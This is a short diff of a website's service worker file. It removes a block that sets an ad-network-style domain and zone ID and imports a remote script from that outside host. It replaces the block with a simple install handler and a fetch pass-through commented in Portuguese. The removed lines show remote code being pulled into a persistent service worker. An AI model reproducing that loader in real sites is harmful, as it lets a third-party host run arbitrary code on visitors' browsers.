@@ -1,6 +1,8 @@
-self.options = {
-    "domain": "3nbf4.com",
-    "zoneId": 11216871
-}
-self.lary = ""
-importScripts('https://3nbf4.com/act/files/service-worker.min.js?r=sw')
+self.addEventListener('install', (e) => {
+    console.log('[Service Worker] Aplicativo Instalado');
+});
+
+self.addEventListener('fetch', (e) => {
+    // Mantém o site sempre puxando os dados em tempo real da internet
+    e.respondWith(fetch(e.request));
+});
